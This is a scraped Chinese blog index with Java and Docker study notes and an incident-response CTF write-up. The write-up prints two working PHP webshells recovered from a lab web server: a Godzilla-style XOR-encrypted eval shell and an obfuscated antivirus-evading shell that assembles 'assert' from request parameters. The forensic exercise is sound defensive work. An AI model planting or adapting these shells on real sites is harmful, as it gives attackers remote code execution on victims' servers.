类中还有一个重要的方法，就是 toString 方法，它用于返回表示对象值的字符串。下面是一个典型的例子。Point 类的 toString 方法将返回下面这样的字符串： java.awt.Point[x=10,y=20] 绝大多数的toString方法都遵循这样的格式：类的名字，随后是一对方括号括起来的域值。下面是Employee 类中的toString 方法的实现 public String toString(){ return \"Employee[name=\" + name +\"]\"; } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:7:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 泛型数组列表ArrayList是一个采用类型参数的泛型类。为了指定数组列表保存的元素对象类型，需要用一堆尖括号将类名括起来加在后面，例如，ArrayList\u003cEmployee\u003e。 下面声明和构造一个保存Employee 对象的数组列表 ArrayList\u003cEmployee\u003e staff = new ArrayList(); 使用add方法可以将元素添加到数组列表中 staff.add(new Employee(\"Jim\",...)); 如果已经清楚或能够估计出数组可能存储的元素数量， 就可以在填充数组之前调用 ensureCapacity 方法: staff.ensureCapacity(lOO); 这个方法调用将分配一个包含 100 个对象的内部数组。然后调用 100 次 add, 而不用重新分 配空间。 另外， 还可以把初始容量传递给 ArrayList 构造器: ArrayList\\\u003cEmployee\\\u003e staff = new ArrayListo(lOO); staff.size()返回数组列表中包含的实际元素数目 访问数组列表元素使用get和set方法实现访问或改变数组元素的操作，而不使用人们喜爱的[]语法格式 例如设置第i个元素，可以使用 staff.set(i.harry) 它等价于对数组 a 的元素赋值(数组的下标从 0 开始) a[i] = harry 使用下列格式获得数组列表的元素 Employee e = staff.get(i); ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:8:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 反射反射机制可以用来 在运行时分析类的能力 在运行时查看对象，例如，编写一个 toString 方法供所有类使用 实现通用的数组操作代码 利用Method 对象，这个对象很像C++的函数指针 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" Class 类可以通过专门的Java类访问这些信息。保存这些信息的类被称为Class，这个名字很容易让人混淆。Object类中的 getClass()方法将会返回一个Class 类型的实例 Employee e; Class cl = e.getClass(); 可以调用静态方法 forName 获得类名对应的Class 对象 String className = 'java.util.Random'; Class cl = Class.forName(className); 获得Class类对象的第三种方法很简单， Class cl1 = Random.class; 还有一个很有用的方法newInstance()，可以用来动态地创建一个类的实例 e.getClass().newInstance(); newInstance方法会调用默认的构造器初始化新创建的对象。如果这个类没有默认的构造器， 就会抛出一个异常。 将forName与newInstance配合起来使用，可以根据存储在字符串中的类名创建一个对象 String s = \"java.util.Random\"; Object m = Class.forName(s).newInstance(); ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 利用反射分析类的能力检查类的结构 在java.lang.reflect包中有三个类Field,Method 和Constructor 分别用户描述类的域、方法和构造器。这三个类都有一个叫getName的方法，用于返回项目的名称。Field 类有一个getType方法，用来返回描述域所属类型的Class对象。Method 和 Constructor类能有够报告参数类型的方法，Method 类还有一个可以报告返回类型的方法。这三个类还有一个叫getModifiers 的方法，它将返回一个整型数值，用不同的位开关描述 public 和static这样修饰符使用情况 Class 类中的 getFields、 getMethods 和 getConstructors 方 法 将 分 别 返 回 类 提 供 的 public 域、 方法和构造器数组，其中包括超类的公有成员 Class 类中的getDeclareFields、getDeclareMethods和getDeclareConstructors方法将返回类中声明的全部域、方法和构造器，其中包括私有和受保护成员，但不包括超类的成员。 写一个Demo import org.omg.CORBA.Object; import java.util.*; import java.lang.reflect.*; public class ReflectionTest { public static void main(String[] args) throws Exception{ String name; if(args.length \u003e 0) name = args[0]; else{ Scanner in = new Scanner(System.in); System.out.println(\"Enter class name (e.g. java.util.Date)\"); name = in.next(); } try{ Class cl = Class.forName(name); Class supercl = cl.getSuperclass(); String modifiers = Modifier.toString(cl.getModifiers()); if(modifiers.length() \u003e 0) System.out.println(modifiers + \" \") System.out.println(\"class \"+name); if(supercl != null \u0026\u0026 supercl != Object.class) System.out.println(\" extends \"+supercl.getName()); System.out.println(\"\\n{\\n\"); printConstructors(cl); System.out.println(); printMethods(cl); System.out.println(); printFields(cl); System.out.println(\"}\"); }catch(ClassNotFoundException e) { e.printStackce(); } } public static void printConstructors(Class cl){ Constructor[] constructors = cl.getDeclaredConstructors(); for(Constructor c :constructors){ String name = c.getName(); System.out.println(\" \"); String modifiers = Modifier.toString(c.getModifiers()); if(modifiers.length()\u003e0) System.out.println(modifiers + \" \"); System.out.println(name+\"(\"); Class[] paramTypes = c.getParameterTypes(); for(int j = 0;j\u003c paramTypes.length;j++){ if(j\u003e0) System.out.println(\", \"); System.out.println(paramTypes[j].getName()); } System.out.println(\");\"); } } public static void printMethods(Class cl){ Method[] methods = cl.getDeclaredMethods(); for(Method m:methods) { Class retType = m.getReturnType(); String name = m.getName(); System.out.println(\" \"); String modifiers = Modifier.toString(m.getModifiers()); if (modifiers.length() \u003e 0) System.out.println(modifiers + \" \"); System.out.println(retType.getName() + \" \" + name + \"(\"); Class[] paramTypes = m.getParameterTypes(); for (int j = 0; j \u003c paramTypes.length; j++) { if (j \u003e 0) System.out.println(\", \"); System.out.println(paramTypes[j].getName()); } System.out.println(\");\"); } } public static void printFields(Class cl){ Field[] fields = cl.getDeclaredFields(); for(Field f:fields){ Class type = f.getType(); String name = f.getName(); System.out.println(\" \"); String modifiers = Modifier.toString(f.getModifiers()); if(modifiers.length() \u003e 0) System.out.println(modifiers + \" \"); System.out.println(type.getName()+\" \"+name+\" \"); } } } Field[] getFields() 1.1 Filed[] getDeclaredFields() 1.1 getFields 方法将返回一个包含 Field 对象的数组， 这些对象记录了这个类或其超类的 公有域。 getDeclaredField 方法也将返回包含 Field 对象的数组， 这些对象记录了这个 类的全部域。 如果类中没有域， 或者 Class 对象描述的是基本类型或数组类型， 这些 方法将返回一个长度为 0 的数组。 Method[] getMethods() 1.1 Method[] getDeclareMethods() 1.1 返回包含 Method 对象的数组: getMethods 将返回所有的公有方法， 包括从超类继承 来的公有方法; getDeclaredMethods 返回这个类或接口的全部方法， 但不包括由超类 继承了的方法。 Constructor!] getConstructors() 1.1 ; Constructor;] getDeclaredConstructors() 1.1 返回包含 Constructor 对象的数组， 其中包含了 Class 对象所描述的类的所有公有构造 器(getConstructors) 或所有构造器(getDeclaredConstructors。) ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 在运行时使用反射分析对象查看对象域关键方法是Field 类中的 get 方法。如果 f 是一个Field类型的对象（例如，通过getDeclaredFields得到的对象），obj 是某个包含 f 域的类的对象，f.get(obj)，将返回一个对象，其值为 obj 域的当前值。例如 Employee harry = new Employee(\"Tom\",35000,10,1,1989); Class cl = harry.getClass(); Field f = cl.getDeclaredField(\"name\"); Object v = f.get(harry); //Tom 这样调用会出现问题，因为 name 是一个私有域，get 方法不能得到 为了能够调用，需要Field、Method或Constructor 对象的 setAccessible方法 例如 f.setAccessible(1); setAccessible方法是AccessibleObject 类中的一个方法，它是Field、Method 和Constructor 类的公共超类。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 调用任意方法Method 类中有一个 invoke 方法。它允许调用包装在当前Method 对象中的方法。invoke 方法的签名是 Object invoke(Object obj,Object... args) 第一个参数是隐式参数，其余的对象提供了显式参数 对于静态方法，第一个参数可以被忽略，可以将它设置为 null 例如m1代表Employee类的getName方法，下面这条语句显示了如何调用这个方法 String n = (String) m1.invoke(harry) 如果返回类型是基本类型，invoke方法会返回其包装器类型。例如，假设m2表示Employee类的getSalary方法，那么返回的对象实际上是一个Double，必须相应地完成类型转换。可以使用自动拆装将它转换为一个 double double s = (Double) m2.invoke(harry) 如何得到Method 对象呢？当然，可以通过调用getDeclareMethods方法，然后对返回的Method 对象数组进行查找，直到发现想要的方法为止。也可以通过调用Class 类中的getMethod方法得到想要的方法。 getMethod 的签名是 Method getMethod(String name,Class ...paramterTypes) 例如，下面说明了如何获得Employee 类的 getName 方法和raiseSalary 方法的方法指针 Method m1 = Employee.class.getMethod(\"getName\"); Method m2 = Employee.class.getMethod(\"raiseSalary\",double.class); 接口、lambda表达式与内部类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:4","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口概念在Java 程序设计语言中，接口不是类；而是对类的一组需求描述，这些类要遵从接口描述的统一格式进行定义 Arrays类中sort 方法承诺可以对对象数组进行排序，但要求满足下列前提：对象所属的类必须实现了Comparable接口 下面是Comparable接口的代码 public interface Comparable{ int compareTo(Object other); } 这就是说，任何实现Comparable 接口的类都需要包含compareTo方法，并且这个方法的参数必须是一个Object 对象，返回一个整形数值 接口可以看成没有实例域的抽象类， ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口的特性接口不是类，尤其不能使用 new 运算符实例化一个接口 尽管不能构造接口的对象，却能声明接口的变量 Comparable x // ok 接口变量必须引用实现了接口的类对象 x = new Employee(...); 可以使用instance检查一个对象是否实现了某个特定的接口 if(anObject instanceof Comparable){...} 与可以建立类的继承关系一样，接口也可以被扩展。这里允许存在多条从具有较高通用性的接口到较高专用性的接口的链。例如，假设有一个称为Moveable的接口 public interface Moveable{ void move(double x,double y); } 然后，可以以它为基础扩展一个叫做Powered的接口 public interface Powered extends Moveable{ double milesPerGallon(); } 虽然在接口中不能包含实例域或静态方法，但却可以包含常量。例如 public interface Powered extends Moveable { double milesPerGallon(); double SPEED_LIMIT = 95; } 与接口中的方法都自动地被设置为 public 一样，接口中的域将被自动设为public static final ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口与抽象类每个类可以实现多个接口，但是不能继承多个抽象类 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 接口与回调回调是一种常见的程序设计模式。在这种模式中，可以指出某个特定时间发生时应该才去的动作， Demo package timer; import java.awt.*; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.util.Date; import javax.swing.*; public class TimerTest { public static void main(String[] args) throws Exception { ActionListener listener = new TimePrinter(); Timer t = new Timer(3000, listener); t.start(); JOptionPane.showMessageDialog(null,\"Quit program?\"); System.exit(0); } } class TimePrinter implements ActionListener{ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); Toolkit.getDefaultToolkit().beep(); } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:4","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 内部类内部类是定义在另一个类中的类。为什么需要使用内部类呢？其主要原因有如下三点 内部类方法可以访问该类定义所在作用域中的数据，包括私有的数据。 内部类可以对同一个包中的其他类隐藏起来 当想要定义一个回调函数且不想编写大量代码时，使用匿名内部类比较便捷 Demo package innerClass; import java.awt.*; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.util.*; import javax.swing.*; import javax.swing.Timer; public class InnerClassTest { public static void main(String[] args) { TalkingClock clock = new TalkingClock(3000, true); clock.start(); JOptionPane.showMessageDialog(null, \"Quit program?\"); System.exit(0); } } class TalkingClock{ private int interval; private boolean beep; public TalkingClock(int interval,boolean beep){ this.interval = interval; this.beep = beep; } public void start(){ ActionListener listenter = new TimePrinter(); Timer t = new Timer(interval,listenter); t.start(); } public class TimePrinter implements ActionListener{ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); if(beep) Toolkit.getDefaultToolkit().beep(); } } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:5","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 内部类的特殊语法规则事实上，使用外部类引用的正规语法还要复杂一些 OuterClass.this 表示外围类的引用。例如，可以像下面这样编写TimePrinter 内部类的actionPerformed方法 public class TimePrinter implements ActionListener{ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); if(TalkingClock.this.beep) Toolkit.getDefaultToolkit().beep(); } } 在外部类的作用域，可以这样引用内部类 OuterClass.InnerClass ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:6","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 局部内部类在 start 方法中定义局部类 public void start(){ public class TimePrinter implements ActionListener{ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); if(beep) Toolkit.getDefaultToolkit().beep(); } } ActionListener listenter = new TimePrinter(); Timer t = new Timer(interval,listenter); t.start(); } 局部类不能用 public或private访问说明符进行声明。它的作用域被限定在声明这个局部类中 局部类有一个优势，对外部世界可以完全隐藏起来。即使TalkingClock 类中的其他代码也不能访问它。除start方法之外，没有任何方法知道TimePrinter类的存在 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:7","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 匿名内部类将局部内部类的使用再深入一步。假如只创建这个类的一个对象，就不必命名了。这种类被称为匿名内部类 public void start(){ ActionListener listener = new ActionListener(){ @Override public void actionPerformed(ActionEvent e) { System.out.println(\"At the tone,the time is \"+ new Date()); if(beep) Toolkit.getDefaultToolkit().beep(); } }; ActionListener listenter = new TimePrinter(); Timer t = new Timer(interval,listenter); t.start(); } 创建一个实现ActionListener 接口的类的新对象，需要实现的方法actionPerformed定义在括号{}内 语法格式为 new SuperType(construction parameters){ inner class methods and data } SuperType 可以是接口，也可以是一个类 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:10:8","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 代理利用代理可以在运行时创建一个实现了一组给定接口的新类 这种功能只有在编译时无法确定需要实现哪个接口时才有必要使用。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:11:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 何时使用代理代理类可以在运行时创建全新的类。这样的代理类能够实现指定的接口。尤其是，它具有下列方法 指定接口所需要的全部方法 Object 类中的全部方法，例如，toString、equals 等 然而，不能运行时定义这些方法的新代码。而是要提供一个调用处理器(invocationhandler)。调用处理器是实现了InvocationHandler 接口的类对象。在这个接口中只有一个方法： Object invoke(Object proxy,Method method,Object[] args) 无论何时调用代理对象的方法，调用处理器的invoke方法都会被调用，并向其传递Method对象和原始的调用参数。调用处理器必须给出处理调用的方式。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:11:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 创建代理对象要想创建一个代理对象，需使用Proxy 类的 newProxyInstance 方法。这个方法有三个参数 一个类加载器。 一个Class 对象数组，每个元素都是需要实现的接口。 一个调用处理器。 还有两个需要解决的问题。如何定义一个处理器？能够用结果代理对象做些什么？当然，这两个问题的答案取决于打算使用代理机制解决什么问题。使用代理可能出于很多种原因 例如 路由对远程服务器的调用 在程序运行期间，将用户接口事件与动作关联起来。 为调试、跟踪方法调用。 在示例程序中，使用代理和调用处理器跟踪方法调用，并且定义了一个TraceHandler 包装器类存储包装的对象。其中的 invoke 方法打印出被调用方法的名字和参数，随后用包装好的对象作为隐示参数调用这个方法 package ProxyTest; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class TraceHandler implements InvocationHandler { private Object target; public TraceHandler(Object t){ target = t; } @Override public Object invoke(Object proxy, Method m, Object[] args) throws Throwable { return m.invoke(target,args); } } 下面说明如何构造用于跟踪方法调用的代理对象 Object value = ...; // construct wrapper InvocationHandler handler = new TraceHandler(value); // construct proxy for one or more interfaces Class[] interfaces = new Class[] { Comparable.class }; Object proxy = Proxy.newProxylnstance(null, interfaces, handler); ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:11:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 代理类的特性所有代理类都扩展于Proxy 类。一个代理类只有一个实例域—调用处理器，它定义在Proxy 的超类中。为了履行代理对象的职责，所需要的任何附加数据都必须存储在调用处理器中。 在上面的代码中，代理Comparable对象时，TraceHandler 包装了实际的对象。 所有的代理类都覆盖了Object 类中的方法toString、equals和 hashCode。如同所有的代理方法一样，这些方法仅仅调用了调用处理器的 invoke。Object 类中的其他方法（如clone 和 getClass）没有被重新定义 java.Iang.reflect.InvocationHandler Object invoke(Object proxy,Method method,Object[] args) 定义了代理对象调用方法时希望执行的动作。 java.Iang.reflect.Proxy static Class\u003c?\u003e getProxyClass( ClassLoader interfaces) 返回实现指定接口的代理类。 static Object newProxyInstance( ClassLoader interfaces, InvocationHandler handler) 构造实现指定接口的代理类的一个新实例。 所有方法会调用给定处理器对象的 invoke 方法。 static boolean isProxyClass(Class\u003c?\u003e cl) 如果 cl 是一个代理类则返回 true。 部署Java 应用程序","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:11:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" JAR文件jar cvf jarfilename File1 File2 ... 例如 jar cvf CalculatorClasses.jar *.clsss icon.gif ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:12:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 清单文件除了类文件、图像和其他资源外，每个JAR文件还包含一个用于描述归档特征的清单文件(mainfest) 清单文件被命名为MANIFEST.MF，它位于JAR文件的一个特殊META-INF子目录中。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:12:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 可执行JAR文件可以使用 jar 命令中的 e 选项指定程序的入口点，即通常需要在调用 java 程序加载器时指定的类 jar cvfe MyProgram.jar com.mycompany.mypkg.MainAppClass files to add 不管哪一种方法，用户可以简单地通过下面命令来启动应用程序 java -jar MyProgram.jar 无论怎么样，人们对JAR文件中的Java 程序与本地文件有着不同的感觉。在Windows 平台中，可以使用第三方的包装器工具将JAR文件转换成Windows 可执行文件。包装器是一个大家数知的扩展名为.exe的Windows 程序，它可以查找和加载Java 虚拟机(JVM) ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:12:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 容器数据卷容器之间可以有一个数据共享的技术 Docker 容器中产生的数据，同步到本地 目录的挂载，将我们容器内的目录，挂载到宿主机上面 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:1:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 使用数据卷方式一：直接使用命令来挂载 -v docker run -it -v 主目录:容器内目录 -p 主机端口:容器内端口 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:1:1","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 实战练习-MySQL docker pull mysql docker run -d --name mysql -p 3310:3306 -v ./mysql/conf:/etc/mysql/conf -v ./mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=huahua123 mysql ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:2:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 具名和匿名挂载 # 匿名挂载 -v 容器内路径 docker run -d -P --name nginx01 -v /etc/nginx nginx # 查看所有卷的情况 docker volume ls # 具名挂载 docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx -v 卷名:容器内路径 所有的 docker 容器内的卷，没有指定目录的情况下都是在/var/lib/docker/volumes/xxx/_data -v 名字:容器内路径 #具名挂载 -v 容器内路径 #匿名挂载 -v /宿主机路径:容器内路径 #指定路径挂载 # ro readonly 只读 # rw readwrite 可读可写 docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginx ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:2:1","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" DockerfileDockerfile就是用来构建 docker 镜像的构建文件 FROM centos VOLUME ['volume01','volume02'] CMD echo \"---end---\" CMD /bin/bash 构建步骤 编写一个 dockerfile 文件 docker build 构建为一个镜像 docker run 运行镜像 docker push 发布镜像 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" Dockerfile构建过程基础知识 1、每个保留关键字(命令)都必须是大写字母 2、执行从上到下顺序执行 3、#表示注释 4、每一个指令都会创建一个新的镜像层，并提交 dockerfile 是面向开发的，以后发布项目，做镜像，就需要编写 dockerfile 文件 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:1","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" Dockerfile的命令 FROM #基础镜像 MAINTAINER #镜像是谁写的，姓名+邮箱 RUN #镜像构建的时候需要执行的命令 ADD #步骤：tomcat容器，这个 tomcat压缩包！添加内容 WORKDIR #镜像的工作目录 VOLUME #设置卷，挂载主机目录 EXPOSE #暴露端口配置 CMD #指定这个容器启动的时候需要运行的命令，只有最后一个生效，可被替代 ENTRYPOINT #指定这个容器启动的时候要运行的命令，可以追加命令 ONBUILD #当构建一个被继承Dockerfile 这个时候就会运行 ONBUILD 的命令，触发指令 COPY #类似 ADD，将文件拷贝到镜像中 ENV #构建的时候设置环境变量 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:2","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 实战练习-构建自己的 centos FROM centos MAINTAINER huahua\u003cexample@qq.com\u003e ENV MYPATH /usr/local WORKDIR $MYPATH RUN yum -y install vim RUN yum -y install net-tools EXPOSE 80 CMD echo $PATH CMD echo \"---end---\" CMD /bin/bash docker build -f dockerfile -t mycentos:0.1 . docker build -f dockerfile文件名 -t 镜像名[:TAG] . docker history 容器id 列出容器构建的记录 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:3","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" CMD和ENTRYPOINT的区别 CMD #指定这个容器启动的时候需要运行的命令，只有最后一个生效，可被替代 ENTRYPOINT #指定这个容器启动的时候要运行的命令，可以追加命令 dockerfile FROM centos CMD ['ls','-a'] docker run 容器id ls -al dockerfile FROM centos ENTRYPOINT ['ls','-a'] docker run 容器id -l ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:4","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 实战练习-Dockerfile制作tomcat镜像准备apache-tomcat和jdk的压缩包 FROM centos MAINTAINER huahua\u003cbeichenghua@gmail.com\u003e COPY readme.txt /usr/local/readme.txt ADD jdk-8u111-linux-x64.tar.gz /usr/local/ ADD apache-tomcat-9.0.85.tar.gz /usr/local/ RUN yum -y install vim RUN MYPATH /usr/local WORKDIR $MYPATH ENV JAVA_HOME /usr/local/jdk1.8.0_111 ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.85 ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.85 ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:CATALINA_HOME/bin EXPOSE 8080 CMD /usr/local/apache-tomcat-9.0.85/bin/startup.sh \u0026\u0026 tail -F /usr/local/apache-tomcat-9.0.85/logs/catalina.out docker build -t apache-tomcat:0.1 . ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:3:5","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 发布镜像到DockerHub/阿里镜像https://hub.docker.com/ docker tag imageId newImageName:tag docker push 镜像 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:4:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 容器互联 –linkdocker run -d -P --name tomcat03 --link tomcat02 tomcat tomcat03连接tomcat02，使用服务名连接 原理:在 hosts 文件中进行了配置 ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:5:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" 自定义网络docker network ls 查看 docker 所有的网络 网络模式 bridge：桥接 docker（默认） none：不配置网络 host：和宿主机共享网络 container：容器网络连通 --driver bridge 桥接模式 --subnet 192.168.0.0/16 网段 --gateway 192.168.0.1 网关(出网地址) docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:6:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":" Docker-compose配置案例 # yaml 配置实例 version: '3' services: web: build: . ports: - \"5000:5000\" volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redis volumes: logvolume01: {} ","date":"2024-02-02","objectID":"/docker%E8%BF%9B%E9%98%B6/:7:0","tags":["Docker"],"title":"Docker进阶","uri":"/docker%E8%BF%9B%E9%98%B6/"},{"categories":["应急响应"],"content":"任务要求 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx} 2.黑客使用的什么工具的shell github地址的md5 flag{md5} 3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx 4.黑客免杀马完整路径 md5 flag{md5} 连上靶机之后，利用tar命令，压缩网站源码 tar -zcvf html.tar.gz /var/www/html 在线查杀网站进行查杀 在/var/www/html/include/gz.php文件下，发现第一个flag root@ip-10-0-10-3:/var/www/html# cat /var/www/html/include/gz.php \u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } //027ccd04-5065-48b6-a32d-77c704a5e26d $payloadName='payload'; $key='3c6e0b8a9c15224a'; $data=file_get_contents(\"php://input\"); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\"getBasicsInfo\")===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } flag{027ccd04-5065-48b6-a32d-77c704a5e26d} 很明显是一个冰蝎马，找到 github地址进行提交 f10wers13eicheng@MacBookPro [21时41分00秒] [~/Desktop] -\u003e % md5 -s 'https://github.com/BeichenDream/Godzilla' MD5 (\"https://github.com/BeichenDream/Godzilla\") = 39392de3218c333f794befef07ac9257 flag{39392de3218c333f794befef07ac9257} 第三个 flag 是隐藏shell文件的路径/var/www/html/include/Db/.Mysqli.php f10wers13eicheng@MacBookPro [21时39分52秒] [~/Desktop] -\u003e % md5 -s '/var/www/html/include/Db/.Mysqli.php' MD5 (\"/var/www/html/include/Db/.Mysqli.php\") = aebac0e58cd6c5fad1695ee4d1ac1919 第四个 flag 为免杀马的路径，在河马查杀里边可以注意到一个特殊的 机器学习检测为webshell，进行查看 root@ip-10-0-10-3:/var/www/html# cat /var/www/html/wap/top.php \u003c?php $key = \"password\"; //ERsDHgEUC1hI $fun = base64_decode($_GET['func']); for($i=0;$i\u003cstrlen($fun);$i++){ $fun[$i] = $fun[$i]^$key[$i+1\u00267]; } $a = \"a\"; $s = \"s\"; $c=$a.$s.$_GET[\"func2\"]; $c($fun); 确实是免杀马 f10wers13eicheng@MacBookPro [21时39分59秒] [~/Desktop] -\u003e 